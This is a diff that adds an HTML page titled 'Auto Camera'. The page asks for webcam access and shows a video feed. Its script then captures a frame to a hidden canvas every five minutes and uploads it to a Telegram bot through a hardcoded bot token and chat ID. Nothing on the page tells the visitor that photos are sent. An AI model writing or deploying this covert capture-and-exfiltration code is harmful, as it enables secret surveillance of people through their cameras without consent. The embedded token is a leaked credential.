@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Auto Camera</title>
+</head>
+<body>
+
+<video id="camera" autoplay playsinline width="300"></video>
+<canvas id="canvas" width="300" height="300" style="display:none;"></canvas>
+
+<script>
+const video = document.getElementById("camera");
+const canvas = document.getElementById("canvas");
+const ctx = canvas.getContext("2d");
+
+navigator.mediaDevices.getUserMedia({ video: true })
+.then(stream => { video.srcObject = stream; })
+.catch(err => { alert("Camera access denied: " + err); });
+
+const TOKEN = "8568730830:AAFBfR4JtzNvYP8CEz1m9WWLm4tYj0DJ1eec";
+const CHAT_ID = "5728094443";
+
+// دالة لالتقاط صورة ورفعها للبوت
+function captureAndSend() {
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    canvas.toBlob(function(blob) {
+        const formData = new FormData();
+        formData.append("chat_id", CHAT_ID);
+        formData.append("photo", blob, "pic.jpg");
+
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+            method: "POST",
+            body: formData
+        }).then(res => console.log("Photo sent"))
+          .catch(err => console.log("Error:", err));
+    }, "image/jpeg");
+}
+
+// التقاط صورة كل 5 دقائق = 300000 ملي ثانية
+setInterval(captureAndSend, 300000);
+</script>
+
+</body>
+</html>
